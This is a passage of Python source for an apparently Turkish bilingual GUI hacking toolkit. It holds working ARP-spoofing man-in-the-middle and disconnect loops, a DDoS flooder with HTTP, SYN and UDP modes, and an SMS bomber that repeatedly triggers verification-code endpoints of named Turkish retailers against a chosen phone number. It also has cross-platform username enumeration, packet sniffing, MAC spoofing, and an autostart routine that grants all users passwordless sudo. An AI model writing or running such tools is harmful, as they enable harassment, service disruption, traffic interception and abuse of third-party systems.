            tgv=tg.get(); gwv=gw.get(); ivv=iv.get()
            self.bg["arps"]={"buf":[],"run":True,"stop":False,"t":threading.Thread(target=self.arps_sp,args=(tgv,gwv,ivv),daemon=True)}
            self.bg["arps"]["t"].start()
        sb=self.bt(self.T("START","BASLAT"),None,6,1,bg="#005500")
        st=self.bt(self.T("STOP","DURDUR"),None,6,1,bg="#660000"); st.grid_remove()
        sb.config(command=lambda: (sb.grid_remove(),st.grid(),basla()))
        st.config(command=lambda: (st.grid_remove(),sb.grid(),setattr(self,"sp_stop",True),self.bg_durdur("arps"),self.bg_yaz("arps",t,self.T("\nStopped","\nDurduruldu"))))
    def arps_sp(self,tgv,gwv,ivv):
        while not self.sp_stop:
            try:
                subprocess.run(["sudo","arpspoof","-i",ivv,"-t",tgv,gwv],timeout=3,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
                subprocess.run(["sudo","arpspoof","-i",ivv,"-t",gwv,tgv],timeout=3,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
            except: pass

    def sniff(self):
        self.ps=self.m_pent; self.clr(); self.cg(8,3); self.bk(); self.tt(self.T("Packet Sniff","Paket Yakala"))
        t=self.tx(2,0,height=5); self.sn_t=t
        if self.bg_aktif("sniff"):
            self.bg_yenile("sniff",t); self.sn_stop=self.bg["sniff"]["stop"]
            self.bg_yaz("sniff",t,self.T(" (running in bg)"," (arka planda calisiyor)\n"))
            self.bt(self.T("STOP","DURDUR"),lambda: (setattr(self,"sn_stop",True),self.bg_durdur("sniff"),self.sniff()),6,1,bg="#660000")
            return
        sb=self.bt(self.T("START","BASLAT"),None,6,1,bg="#005500")
        st=self.bt(self.T("STOP","DURDUR"),None,6,1,bg="#660000"); st.grid_remove()
        self.sn_stop=False; self.bg["sniff"]={"buf":[],"run":True,"stop":False,"t":threading.Thread(target=self.sniff_thr,daemon=True)}
        def basla():
            sb.grid_remove(); st.grid()
            self.sn_stop=False; t.delete(1.0,tk.END)
            self.bg_yaz("sniff",t,self.T("Sniffing... STOP to end","Yakaliyor... DURDUR ile bitir\n")); self.f.update()
            self.bg["sniff"]["t"].start()
        st.config(command=lambda: (st.grid_remove(),sb.grid(),setattr(self,"sn_stop",True),self.bg_durdur("sniff"),self.bg_yaz("sniff",t,self.T("\nStopped","\nDurduruldu"))))
        sb.config(command=basla)
    def sniff_thr(self):
        while not self.sn_stop:
            if os.name=="nt":
                r=subprocess.run("netstat -n 1",shell=True,capture_output=True,text=True,timeout=2)
                for l in r.stdout.split("\n"):
                    if "ESTABLISHED" in l or "TIME_WAIT" in l:
                        self.bg_yaz("sniff",self.sn_t,l.strip()[:60]+"\n"); self.f.update()
            else:
                try:
                    r=subprocess.run(["tcpdump","-c","3","-n","-t","-q"],capture_output=True,text=True,timeout=3)
                    for l in r.stdout.split("\n"):
                        if l.strip(): self.bg_yaz("sniff",self.sn_t,l.strip()[:60]+"\n"); self.f.update()
                except: pass

    def disc(self):
        self.ps=self.m_pent; self.clr(); self.cg(8,3); self.bk(); self.tt(self.T("Disconnect","Baglanti Kes"))
        if os.name=="nt": self.tx(2,0,height=1).insert(tk.END,self.T("Linux only","Sadece Linux")); return
        self.lb(self.T("Target:","Hedef:"),2,0); tg=self.en(2,1); tg.insert(0,"192.168.1.100")
        self.lb(self.T("Gateway:","Ag Geçidi:"),3,0); gw=self.en(3,1); gw.insert(0,"192.168.1.1")
        self.lb(self.T("Interface:","Arayuz:"),4,0); iv=tk.StringVar(value="eth0")
        r=subprocess.run("ip -o link show|grep -v lo|cut -d: -f2",shell=True,capture_output=True,text=True)
        ifs=[x.strip() for x in r.stdout.split() if x.strip()]
        if ifs: iv.set(ifs[0])
        self.cb(4,1,ifs,iv,w=12)
        t=self.tx(5,0,height=2); self.dc_t=t
        if self.bg_aktif("disc"):
            self.bg_yenile("disc",t); self.dc_stop=self.bg["disc"]["stop"]
            self.bg_yaz("disc",t,self.T(" (running in bg)"," (arka planda calisiyor)\n"))
            self.bt(self.T("STOP","DURDUR"),lambda: (setattr(self,"dc_stop",True),self.bg_durdur("disc"),self.disc()),6,1,bg="#660000")
            return
        self.dc_stop=False
        def basla():
            self.dc_stop=False; t.delete(1.0,tk.END)
            self.bg_yaz("disc",t,self.T("Disconnecting...","Baglanti kesiliyor...\n")); self.f.update()
            tgv=tg.get(); gwv=gw.get(); ivv=iv.get()
            self.bg["disc"]={"buf":[],"run":True,"stop":False,"t":threading.Thread(target=self.disc_thr,args=(tgv,gwv,ivv),daemon=True)}
            self.bg["disc"]["t"].start()
        sb=self.bt(self.T("START","BASLAT"),None,6,1,bg="#005500")
        st=self.bt(self.T("STOP","DURDUR"),None,6,1,bg="#660000"); st.grid_remove()
        sb.config(command=lambda: (sb.grid_remove(),st.grid(),basla()))
        st.config(command=lambda: (st.grid_remove(),sb.grid(),setattr(self,"dc_stop",True),self.bg_durdur("disc"),self.bg_yaz("disc",t,self.T("\nStopped","\nDurduruldu"))))
    def disc_thr(self,tgv,gwv,ivv):
        while not self.dc_stop:
            try:
                subprocess.run(["sudo","arpspoof","-i",ivv,"-t",tgv,gwv],timeout=3,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
            except: pass

    def block(self):
        self.ps=self.m_pent; self.clr(); self.cg(8,3); self.bk(); self.tt(self.T("Block Internet","Internet Engelle"))
        self.lb(self.T("Target:","Hedef:"),2,0); tg=self.en(2,1); tg.insert(0,"192.168.1.100")
        t=self.tx(3,0,height=3)
        def blk():
            t.delete(1.0,tk.END)
            if os.name=="nt":
                r=subprocess.run(["netsh","advfirewall","firewall","add","rule",
                    f"name=AHT_BLOCK_{tg.get()}","dir=out","action=block",f"remoteip={tg.get()}"],
                    capture_output=True,text=True)
                r2=subprocess.run(["netsh","advfirewall","firewall","add","rule",
                    f"name=AHT_BLOCK_{tg.get()}_IN","dir=in","action=block",f"remoteip={tg.get()}"],
                    capture_output=True,text=True)
                t.insert(tk.END,self.T("Firewall rules added","Guvenlik duvari kurallari eklendi"))
            else:
                r=subprocess.run(f"sudo iptables -A FORWARD -d {tg.get()} -j DROP",shell=True,capture_output=True,text=True)
                r2=subprocess.run(f"sudo iptables -A FORWARD -s {tg.get()} -j DROP",shell=True,capture_output=True,text=True)
                t.insert(tk.END,self.T("iptables rules added","iptables kurallari eklendi"))
            t.insert(tk.END,f"\n{tg.get()} {self.T('blocked','engellendi')}")
        def unblk():
            t.delete(1.0,tk.END)
            if os.name=="nt":
                subprocess.run(["netsh","advfirewall","firewall","delete","rule",f"name=AHT_BLOCK_{tg.get()}"],capture_output=True)
                subprocess.run(["netsh","advfirewall","firewall","delete","rule",f"name=AHT_BLOCK_{tg.get()}_IN"],capture_output=True)
            else:
                subprocess.run(f"sudo iptables -D FORWARD -d {tg.get()} -j DROP",shell=True,capture_output=True)
                subprocess.run(f"sudo iptables -D FORWARD -s {tg.get()} -j DROP",shell=True,capture_output=True)
            t.insert(tk.END,self.T("Rules removed","Kurallar kaldirildi"))
        self.bt(self.T("BLOCK","ENGELLE"),blk,6,0,bg="#660000")
        self.bt(self.T("UNBLOCK","KALDIR"),unblk,6,2,bg="#005500")

    # ===================== ATTACK =====================
    def m_atk(self):
        self.ps=self.show_main; self.clr(); self.cg(4,3); self.bk(); self.tt(self.T("ATTACK","SALDIRI"))
        for t,c,r,c2 in [(self.T("DDoS","DDoS"),self.ddos,2,0),(self.T("SMS Bomber","SMS Bomber"),self.sms,2,2)]: self.bt(t,c,r,c2)

    def ddos(self):
        self.ps=self.m_atk; self.clr(); self.cg(8,3); self.bk(); self.tt("DDoS")
        if self.bg_aktif("ddos"):
            self.lb(self.T("Target:","Hedef:"),2,0); h=self.en(2,1); h.insert(0,"127.0.0.1")
            self.lb("Port:",3,0); p=self.en(3,1); p.insert(0,"80")
            self.lb(self.T("Threads:","Iplik:"),4,0); th=self.en(4,1); th.insert(0,"50")
            dv=tk.StringVar(value="http"); self.cb(5,0,["http","syn","udp"],dv,w=8)
            t=self.tx(6,0,height=1); self.dd_t=t; self.bg_yenile("ddos",t)
            self.bg_yaz("ddos",t,self.T(" (running in bg)"," (arka planda calisiyor)\n"))
            self.bt(self.T("STOP","DURDUR"),lambda: (setattr(self,"dd_stop",True),self.bg_durdur("ddos"),self.ddos()),7,1,bg="#660000")
            return
        self.dd_stop=False; h=self.en(2,1); h.insert(0,"127.0.0.1")
        p=self.en(3,1); p.insert(0,"80"); th=self.en(4,1); th.insert(0,"50")
        dv=tk.StringVar(value="http"); self.cb(5,0,["http","syn","udp"],dv,w=8)
        t=self.tx(6,0,height=1); self.dd_t=t
        sb=self.bt(self.T("START","BASLAT"),None,7,1,bg="#005500")
        st=self.bt(self.T("STOP","DURDUR"),None,7,1,bg="#660000"); st.grid_remove()
        sb.config(command=lambda: (sb.grid_remove(),st.grid(),self.ddos_basla(h.get(),p.get(),th.get(),dv.get())))
        st.config(command=lambda: (st.grid_remove(),sb.grid(),setattr(self,"dd_stop",True),self.bg_durdur("ddos"),self.dd_t.insert(tk.END,self.T("\nStopped","\nDurduruldu"))))
    def ddos_basla(self,tg,po,ip,tp):
        self.dd_stop=False; self.bg["ddos"]={"buf":[],"run":True,"stop":False,"t":threading.Thread(target=self.ddos_sldr,args=(tg,int(po),int(ip),tp),daemon=True)}
        self.bg["ddos"]["t"].start()
        self.bg_yaz("ddos",self.dd_t,self.T(f"{tp} flood starting...","{tp} flood basliyor...\n"))
    def ddos_sldr(self,tg,po,ip,tp):
        while not self.dd_stop:
            try:
                if tp=="http":
                    s=socket.socket(); s.settimeout(2); s.connect((tg,po))
                    s.send(f"GET / HTTP/1.1\r\nHost: {tg}\r\n".encode()); time.sleep(10); s.close()
                elif tp=="syn":
                    s=socket.socket(); s.settimeout(1)
                    try: s.connect((tg,po))
                    except: pass; s.close()
                elif tp=="udp":
                    s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
                    s.sendto(random._urandom(512),(tg,po)); s.close()
            except: pass
    def bg_durdur(self,ad):
        if ad in self.bg: self.bg[ad]["stop"]=True; self.bg[ad]["run"]=False

    # ===================== OSINT =====================
    def m_osint(self):
        self.ps=self.show_main; self.clr(); self.cg(4,3); self.bk(); self.tt(self.T("OSINT","OSINT"))
        for t,c,r,c2 in [(self.T("Web Search","Web Ara"),self.web,2,0),(self.T("User Search","Kullanici Ara"),self.user,2,1),
            (self.T("Phone OSINT","Telefon OSINT"),self.phone,2,2),(self.T("Dorking","Dorking"),self.dork,3,0)]: self.bt(t,c,r,c2)

    def web(self):
        self.ps=self.m_osint; self.clr(); self.cg(7,3); self.bk(); self.tt(self.T("Web Search","Web Ara"))
        self.lb(self.T("Query:","Sorgu:"),2,0); e=self.en(2,1,w=24)
        t=self.tx(3,0,height=4)
        def q():
            t.delete(1.0,tk.END)
            try:
                r=urllib.request.urlopen(f"https://html.duckduckgo.com/html/?q={urllib.parse.quote(e.get())}",timeout=10)
                for href,tx in re.findall(r'class="result__a"[^>]*href="(.*?)"[^>]*>(.*?)</a>',r.read().decode("utf-8","ignore"))[:5]:
                    t.insert(tk.END,f"{re.sub(r'<[^>]+>','',tx).strip()[:45]}\n{href[:40]}\n\n")
            except: t.insert(tk.END,self.T("Error","Hata"))
        self.be(e,q); self.ac(self.T("SEARCH","ARA"),q,6)

    def user(self):
        self.ps=self.m_osint; self.clr(); self.cg(7,3); self.bk(); self.tt(self.T("User Search","Kullanici Ara"))
        self.lb(self.T("Username:","Kullanici:"),2,0); e=self.en(2,1,w=24)
        t=self.tx(3,0,height=4)
        def q():
            t.delete(1.0,tk.END); k=e.get().strip()
            if not k: return
            sites=[("GitHub",f"https://github.com/{k}"),("Twitter/X",f"https://x.com/{k}"),("Instagram",f"https://instagram.com/{k}"),
                ("Reddit",f"https://reddit.com/user/{k}"),("YouTube",f"https://youtube.com/@{k}"),("TikTok",f"https://tiktok.com/@{k}"),
                ("Snapchat",f"https://snapchat.com/add/{k}"),("Facebook",f"https://facebook.com/{k}"),
                ("LinkedIn",f"https://linkedin.com/in/{k}"),("Pinterest",f"https://pinterest.com/{k}"),
                ("Twitch",f"https://twitch.tv/{k}"),("Telegram",f"https://t.me/{k}"),("Tumblr",f"https://tumblr.com/{k}"),
                ("Medium",f"https://medium.com/@{k}"),("Steam",f"https://steamcommunity.com/id/{k}"),
                ("Spotify",f"https://open.spotify.com/user/{k}"),("Dev.to",f"https://dev.to/{k}"),
                ("Behance",f"https://behance.net/{k}"),("Dribbble",f"https://dribbble.com/{k}"),
                ("Flickr",f"https://flickr.com/people/{k}"),("VK",f"https://vk.com/{k}"),
                ("SoundCloud",f"https://soundcloud.com/{k}"),("Bandcamp",f"https://bandcamp.com/{k}"),
                ("Keybase",f"https://keybase.io/{k}"),("Imgur",f"https://imgur.com/user/{k}"),
                ("Fiverr",f"https://fiverr.com/{k}"),("HackerNews",f"https://news.ycombinator.com/user?id={k}"),
                ("Gravatar",f"https://en.gravatar.com/{k}"),("About.me",f"https://about.me/{k}"),
                ("ProductHunt",f"https://producthunt.com/@{k}"),("Vimeo",f"https://vimeo.com/{k}"),
                ("Threads",f"https://threads.net/@{k}"),("DailyMotion",f"https://dailymotion.com/{k}")]
            for ad,url in sites:
                try:
                    if urllib.request.urlopen(urllib.request.Request(url,headers={"User-Agent":"Mozilla/5.0"}),timeout=3).status==200:
                        t.insert(tk.END,f"+ {ad}: @{k}\n"); self.f.update()
                except: pass
            t.insert(tk.END,self.T("Done","Tamam"))
        self.be(e,q); self.ac(self.T("SEARCH","ARA"),q,6)

    def phone(self):
        self.ps=self.m_osint; self.clr(); self.cg(9,3); self.bk(); self.tt("Phone OSINT")
        self.lb(self.T("Phone:","Telefon:"),2,0); e=self.en(2,1); self.np(e,4)
        t=self.tx(3,0,height=2)
        def q():
            t.delete(1.0,tk.END); tem="".join(c for c in e.get() if c.isdigit())
            if len(tem)<10: t.insert(tk.END,self.T("Invalid","Gecersiz")); return
            kod=tem[:3]
            op={"530":"Turkcell","532":"Turkcell","540":"Vodafone","541":"Vodafone","542":"Vodafone",
                "543":"Vodafone","544":"Vodafone","545":"Vodafone","546":"Vodafone","550":"TT","551":"TT",
                "552":"TT","553":"TT","554":"TT","555":"TT","501":"Turkcell","505":"Turkcell",
                "506":"Vodafone","507":"Vodafone"}.get(kod,"?")
            t.insert(tk.END,f"{self.T('Operator','Operator')}: {op}\nGoogle:\n")
            for l in [f"tel:+90{tem}",f"inurl:{tem}",f"+90{tem[:3]} {tem[3:6]} {tem[6:]}"]:
                t.insert(tk.END,f"  https://google.com/search?q={urllib.parse.quote(l)}\n")
        self.ac(self.T("QUERY","SORGULA"),q,8)

    def dork(self):
        self.ps=self.m_osint; self.clr(); self.cg(7,3); self.bk(); self.tt("Google Dorking")
        self.lb(self.T("Query:","Sorgu:"),2,0); e=self.en(2,1,w=24)
        ft=tk.StringVar(value="none")
        self.cb(3,0,["none","pdf","doc","xls","txt","csv","json","sql","php","asp","xml","zip","log"],ft,w=8)
        t=self.tx(4,0,height=3)
        def q():
            t.delete(1.0,tk.END); qs=e.get().strip()
            if ft.get()!="none": qs+=f" filetype:{ft.get()}"
            try:
                r=urllib.request.urlopen(f"https://html.duckduckgo.com/html/?q={urllib.parse.quote(qs)}",timeout=10)
                for href,tx in re.findall(r'class="result__a"[^>]*href="(.*?)"[^>]*>(.*?)</a>',r.read().decode("utf-8","ignore"))[:6]:
                    t.insert(tk.END,f"{re.sub(r'<[^>]+>','',tx).strip()[:40]}\n{href[:35]}\n\n")
            except: t.insert(tk.END,self.T("Error","Hata"))
        self.be(e,q); self.ac(self.T("SEARCH","ARA"),q,6)

    def sms(self):
        self.ps=self.m_atk; self.clr(); self.cg(9,3); self.bk(); self.tt("SMS Bomber")
        self.lb(self.T("Phone:","Telefon:"),2,0); e=self.en(2,1,w=20,colspan=2)
        sv=tk.StringVar(value="tr"); self.cb(3,0,["tr","intl"],sv,w=6)
        nf=tk.Frame(self.cf,bg=BG); nf.grid(row=5,column=0,rowspan=4,sticky="nsew",padx=(2,6))
        for i in range(3): nf.grid_columnconfigure(i,weight=1)
        for i in range(4): nf.grid_rowconfigure(i,weight=1)
        for ri,ks in enumerate([["1","2","3"],["4","5","6"],["7","8","9"],[".","0","BS"]]):
            for ci,k in enumerate(ks):
                def ek(kv=k,e=e):
                    if kv=="BS": t=e.get()[:-1]; e.delete(0,tk.END); e.insert(0,t)
                    else: e.insert(tk.END,kv)
                tk.Button(nf,text=k,command=ek,bg="#444",fg=FG,font=FL,
                          relief="raised",bd=2,activebackground="#666"
                          ).grid(row=ri,column=ci,padx=1,pady=1,sticky="nsew")
        t=self.tx(5,1,height=8,colspan=2,rowspan=4,padx=(6,2)); self.sm_stop=False; self.sm_t=t
        if self.bg_aktif("sms"):
            self.bg_yenile("sms",t); self.sm_stop=self.bg["sms"]["stop"]
            self.bg_yaz("sms",t,self.T(" (running in bg)"," (arka planda calisiyor)\n"))
            self.bt(self.T("STOP","DURDUR"),lambda: (setattr(self,"sm_stop",True),self.bg_durdur("sms"),self.sms()),4,1,bg="#660000")
            return
        sb=self.bt(self.T("START","BASLAT"),None,4,1,bg="#005500")
        st=self.bt(self.T("STOP","DURDUR"),None,4,1,bg="#660000"); st.grid_remove()
        def basla():
            sb.grid_remove(); st.grid(); self.f.update()
            self.sm_stop=False; t.delete(1.0,tk.END); no=e.get()
            if len(no)<10: sb.grid(); st.grid_remove(); messagebox.showerror(self.T("Error","Hata"),self.T("Invalid num","Gecersiz")); return
            apis=[]
            if sv.get()=="tr":
                apis=[("KahveDunyasi","https://www.kahvedunyasi.com/ajax/Account/LoginSendPhoneCode?phone={}"),
                    ("BIM","https://www.bim.com.tr/Account/SendSms?PhoneNumber={}"),
                    ("A101","https://www.a101.com.tr/api/account/phone-code?phone={}"),
                    ("Mopas","https://www.mopas.com.tr/api/v1/member/send/phone?phone={}"),
                    ("EnglishHome","https://www.englishhome.com/ajax/Account/SendSms?phoneNumber={}"),
                    ("MetroTR","https://www.metro-tr.com/api/Account/LoginSendCode?phone={}"),
                    ("Koton","https://www.koton.com/ajax/Account/PhoneLogin?phone={}"),
                    ("LittleCaesars","https://www.littlecaesars.com.tr/api/Account/SendSmsCode?phone={}"),
                    ("Domino's","https://www.dominos.com.tr/api/Account/SendVerificationCode?phone={}"),
                    ("Pidem","https://www.pidem.com.tr/api/Account/SendSmsCode?phone={}"),
                    ("UysalMarket","https://www.uysalmarket.com/api/Account/SendSms?phone={}"),
                    ("FileMarket","https://www.filemarket.com/api/Account/SendSmsCode?phone={}"),
                    ("Yapp","https://www.yapp.com.tr/api/Account/SendSms?phone={}"),
                    ("TiklaGelsin","https://www.tiklagelsin.com/api/Auth/SendOtp?phone={}"),
                    ("SokMarket","https://www.sokmarket.com.tr/api/Account/SendSms?phoneNumber={}"),
                    ("Komagene","https://www.komagene.com.tr/api/Account/SendPhoneCode?phone={}"),
                    ("WMF","https://www.wmf.com.tr/ajax/Account/SendPhoneCode?phone={}"),
                    ("Coffy","https://www.coffy.com.tr/api/Account/SendSms?phone={}")]
            else:
                apis=[("Textbelt","https://textbelt.com/text"),("Callmebot","https://api.callmebot.com/sms/send")]
            self.bg["sms"]={"buf":[],"run":True,"stop":False,"t":threading.Thread(target=self.sms_thr,args=(no,apis,sv.get()),daemon=True)}
            self.bg["sms"]["t"].start()
        def dur(): st.grid_remove(); sb.grid(); setattr(self,"sm_stop",True); self.bg_durdur("sms"); self.bg_yaz("sms",t,self.T("\nStopped","\nDurduruldu"))
        st.config(command=dur); sb.config(command=basla)
    def sms_thr(self,no,apis,ulke):
        tur=0
        while not self.sm_stop:
            tur+=1; self.bg_yaz("sms",self.sm_t,f"\n--- Round {tur} ---\n")
            for ad,url in apis:
                if self.sm_stop: break
                try:
                    if ulke=="intl":
                        req=urllib.request.Request(url,data=urllib.parse.urlencode({"phone":no,"message":"test"}).encode(),
                                                    headers={"User-Agent":"Mozilla/5.0","Content-Type":"application/x-www-form-urlencoded"})
                    else:
                        req=urllib.request.Request(url.format(no),headers={"User-Agent":"Mozilla/5.0"})
                    urllib.request.urlopen(req,timeout=5)
                    self.bg_yaz("sms",self.sm_t,f"+ {ad}\n")
                except: self.bg_yaz("sms",self.sm_t,f"- {ad}\n"); self.f.update()
                if self.sm_stop: break
                time.sleep(0.2)
        self.bg_yaz("sms",self.sm_t,self.T("Stopped","Durdu"))

    # ===================== TOOLS =====================
    def m_tools(self):
        self.ps=self.show_main; self.clr(); self.cg(5,3); self.bk(); self.tt(self.T("TOOLS","ARACLAR"))
        for t,c,r,c2 in [(self.T("MAC Changer","MAC Degistir"),self.mac,2,0),(self.T("Hash Gen","Hash Olustur"),self.hashg,2,1),
            (self.T("Pass Gen","Sifre Olustur"),self.passg,2,2),(self.T("System Info","Sistem Bilgi"),self.sys,3,0)]: self.bt(t,c,r,c2)

    def mac(self):
        self.ps=self.m_tools; self.clr(); self.cg(8,3); self.bk(); self.tt("MAC Changer")
        t=self.tx(2,0,height=1)
        if os.name=="nt": t.insert(tk.END,self.T("Linux only","Sadece Linux")); return
        r=subprocess.run("ip link show|grep -E '^[0-9]'|cut -d: -f2",shell=True,capture_output=True,text=True)
        ifs=[x.strip() for x in r.stdout.split() if x.strip() and x.strip()!="lo"]
        if not ifs: t.insert(tk.END,self.T("No interfaces","Arayuz yok")); return
        self.lb(self.T("Interface:","Arayuz:"),3,0); iv=tk.StringVar(value=ifs[0])
        self.cb(3,1,ifs,iv,w=12)
        self.lb("MAC:",4,0); e=self.en(4,1); e.insert(0,"00:11:22:33:44:55")
        t2=self.tx(5,0,height=2)
        def deg():
            t2.delete(1.0,tk.END)
            try:
                subprocess.run(["sudo","ifconfig",iv.get(),"down"],check=True)
                subprocess.run(["sudo","ifconfig",iv.get(),"hw","ether",e.get()],check=True)
                subprocess.run(["sudo","ifconfig",iv.get(),"up"],check=True)
                t2.insert(tk.END,self.T("MAC changed","MAC degisti"))
            except Exception as ex: t2.insert(tk.END,f"{self.T('Error','Hata')}: {ex}")
        def rst():
            t2.delete(1.0,tk.END)
            try:
                subprocess.run(["sudo","ifconfig",iv.get(),"down"],check=True)
                subprocess.run(["sudo","ifconfig",iv.get(),"up"],check=True)
                t2.insert(tk.END,self.T("Restored","Geri alindi"))
            except Exception as ex: t2.insert(tk.END,f"{self.T('Error','Hata')}: {ex}")
        self.bt(self.T("CHANGE","DEGISTIR"),deg,6,0,bg="#005500")
        self.bt(self.T("RESTORE","GERI AL"),rst,6,2,bg="#444")

    def hashg(self):
        self.ps=self.m_tools; self.clr(); self.cg(7,3); self.bk(); self.tt(self.T("Hash Gen","Hash Olustur"))
        self.lb(self.T("Text:","Metin:"),2,0); e=self.en(2,1,w=24)
        hv=tk.StringVar(value="md5")
        self.cb(3,0,["md5","sha1","sha256","sha512"],hv,w=8)
        t=self.tx(4,0,height=2)
        def q():
            t.delete(1.0,tk.END); txt=e.get().encode()
            h={"md5":hashlib.md5,"sha1":hashlib.sha1,"sha256":hashlib.sha256,"sha512":hashlib.sha512}.get(hv.get(),hashlib.md5)(txt).hexdigest()
            t.insert(tk.END,f"{hv.get().upper()}: {h}")
        self.be(e,q); self.ac(self.T("GENERATE","OLUSTUR"),q,6)

    def passg(self):
        self.ps=self.m_tools; self.clr(); self.cg(9,3); self.bk(); self.tt(self.T("Pass Gen","Sifre Olustur"))
        self.lb(self.T("Length:","Uzunluk:"),2,0); e=self.en(2,1); e.insert(0,"16")
        self.np(e,4); t=self.tx(3,0,height=2)
        def q():
            try:
                uz=int(e.get()); ch=string.ascii_letters+string.digits+"!@#$%^&*"
                t.delete(1.0,tk.END); t.insert(tk.END,"".join(random.choice(ch) for _ in range(uz)))
            except: t.delete(1.0,tk.END); t.insert(tk.END,self.T("Invalid","Gecersiz"))
        self.ac(self.T("GENERATE","OLUSTUR"),q,8)

    def sys(self):
        self.ps=self.m_tools; self.clr(); self.cg(7,3); self.bk(); self.tt(self.T("System Info","Sistem Bilgisi"))
        t=self.tx(2,0,height=5)
        def q():
            t.delete(1.0,tk.END)
            try: h=socket.gethostname(); t.insert(tk.END,f"Host: {h}\nIP: {socket.gethostbyname(h)}\n")
            except: pass
            t.insert(tk.END,f"OS: {sys.platform} | {os.name}\nPID: {os.getpid()}\n")
            if os.name=="nt":
                r=subprocess.run("wmic os get caption",shell=True,capture_output=True,text=True,timeout=5)
                if r.stdout:
                    l2=r.stdout.strip().split("\n")
                    if len(l2)>1: t.insert(tk.END,f" {l2[1].strip()}\n")
            else:
                try:
                    r=subprocess.run(["uname","-a"],capture_output=True,text=True,timeout=5)
                    t.insert(tk.END,r.stdout.strip()+"\n")
                    r2=subprocess.run(["free","-h"],capture_output=True,text=True,timeout=5)
                    for l in r2.stdout.split("\n")[:2]: t.insert(tk.END,l+"\n")
                    r3=subprocess.run(["cat","/proc/cpuinfo"],capture_output=True,text=True,timeout=2)
                    for l in r3.stdout.split("\n"):
                        if "Model" in l or "Hardware" in l: t.insert(tk.END,l.strip()+"\n")
                except: pass
        q(); self.ac(self.T("REFRESH","YENILE"),q,6)

    def otostart(self):
        self.ps=self.show_main; self.clr(); self.cg(7,3); self.bk(); self.tt(self.T("Auto Start","Oto Acilis"))
        t=self.tx(2,0,height=5)
        scr=os.path.abspath(sys.argv[0]); ex=sys.executable
        wr=os.path.join(os.path.expanduser("~/.config/autostart"),"aht.sh")
        au=os.path.expanduser("~/.config/autostart")
        lx=os.path.expanduser("~/.config/lxsession/LXDE-pi/autostart")
        df=os.path.join(au,"aht.desktop"); sd="/etc/sudoers.d/aht"
        try: lx_aktif=os.path.isfile(lx) and open(lx).read().find(wr)!=-1
        except: lx_aktif=False
        sd_aktif=os.path.isfile(sd) if os.name=="posix" else False
        aktif=os.path.isfile(df) and sd_aktif
        t.insert(tk.END,self.T("Auto start: ACTIVE\n","Oto baslat: AKTIF\n") if aktif else self.T("Auto start: OFF\n","Oto baslat: KAPALI\n"))
        t.insert(tk.END,self.T("Uses sudo (passwordless) + XDG/LXDE\n","sudo ile acilir (sifresiz) + XDG/LXDE\n"))
        t.insert(tk.END,self.T("ENABLE: enter sudo password once\n","AKTIF ET: bir kere sudo sifresi girin\n"))
        def ac():
            with open(wr,"w") as f:
                f.write("#!/bin/bash\n")
                f.write(f"exec >> /tmp/aht.log 2>&1\necho === AHT $(date) ===\n")
                f.write(f"export DISPLAY=:0\nsudo {ex} {scr}\n")
            os.chmod(wr,0o755)
            os.makedirs(au,exist_ok=True)
            with open(df,"w") as f:
                f.write(f"[Desktop Entry]\nType=Application\nName=AHT\nExec={wr}\n"
                        f"X-GNOME-Autostart-enabled=true\nX-LXDE-Autostart=true\n")
            os.chmod(df,0o755)
            os.makedirs(os.path.dirname(lx),exist_ok=True)
            with open(lx,"a") as f: f.write(f"@{wr}\n")
            try:
                subprocess.run(["sudo","sh","-c",
                    f'echo "ALL ALL=(ALL) NOPASSWD: {ex} {scr}" > {sd} && chmod 440 {sd}'],
                    timeout=30)
            except: pass
            self.otostart()
        def kapat():
            for p in [df,wr]: 
                if os.path.isfile(p): os.remove(p)
            try:
                if os.path.isfile(lx):
                    with open(lx) as f: ls=f.read().replace(f"@{wr}\n","")
                    with open(lx,"w") as f: f.write(ls)
            except: pass
            if os.path.isfile(sd):
                try: subprocess.run(["sudo","-n","rm","-f",sd],capture_output=True,timeout=5)
                except: pass
            self.otostart()
        self.bt(self.T("ENABLE","AKTIF ET"),ac,6,0,colspan=3,bg="#005500") if not aktif else self.bt(self.T("DISABLE","KAPAT"),kapat,6,0,colspan=3,bg="#660000")

    # ===================== INTERNET =====================
    def m_internet(self):
        self.ps=self.show_main; self.clr(); self.cg(8,3); self.bk(); self.tt(self.T("INTERNET","INTERNET"))
        self.lb(self.T("SSID:","SSID:"),2,0); e=self.en(2,1,w=20)
        self.lb(self.T("Pass:","Sifre:"),3,0); p=self.en(3,1,w=20)
        t=self.tx(4,0,height=4)
        t.config(cursor="hand2")
        t.tag_config("net",foreground="#8cf",font=("DejaVu Sans",10,"bold"))
        def tikla(ev):
            idx=t.index(f"@{ev.x},{ev.y}"); line=t.get(f"{idx} linestart",f"{idx} lineend").strip()
            ssid=line.split(" (")[0].strip() if " (" in line else ""
            if ssid: e.delete(0,tk.END); e.insert(0,ssid)
        t.bind("<Button-1>",tikla)
        def tara():
            t.delete(1.0,tk.END); t.insert(tk.END,self.T("Scanning...\n","Taranıyor...\n")); self.f.update()
            try:
                r=subprocess.run(["nmcli","-t","-f","SSID,SIGNAL,SECURITY","dev","wifi","list"],
                               capture_output=True,text=True,timeout=15)
                for l in r.stdout.strip().split("\n"):
                    if ":" in l:
                        ssid,sinyal,guv=l.split(":",2)
                        if ssid: t.insert(tk.END,f"{ssid} ({sinyal}% {guv})\n","net")
                if not r.stdout.strip(): t.insert(tk.END,self.T("No networks","Ag bulunamadi"))
            except FileNotFoundError: t.insert(tk.END,self.T("nmcli not found\nInstall: sudo apt install network-manager","nmcli bulunamadi"))
            except Exception as ex: t.insert(tk.END,f"{self.T('Error','Hata')}: {ex}")
        def baglan():
            ssid=e.get().strip(); pwd=p.get().strip()
            if not ssid: return
            t.delete(1.0,tk.END); t.insert(tk.END,self.T(f"Connecting to {ssid}...\n",f"{ssid}'e baglaniliyor...\n")); self.f.update()
            try:
                cmd=["nmcli","dev","wifi","connect",ssid]
                if pwd: cmd+=["password",pwd]
                r=subprocess.run(cmd,capture_output=True,text=True,timeout=30)
                if r.returncode==0: t.insert(tk.END,self.T("Connected!\n","Baglandi!\n"))
                else: t.insert(tk.END,f"{self.T('Failed','Hata')}: {r.stderr[:200]}")
            except Exception as ex: t.insert(tk.END,f"{self.T('Error','Hata')}: {ex}")
        self.bt(self.T("SCAN","TARA"),tara,7,0,bg="#005500")
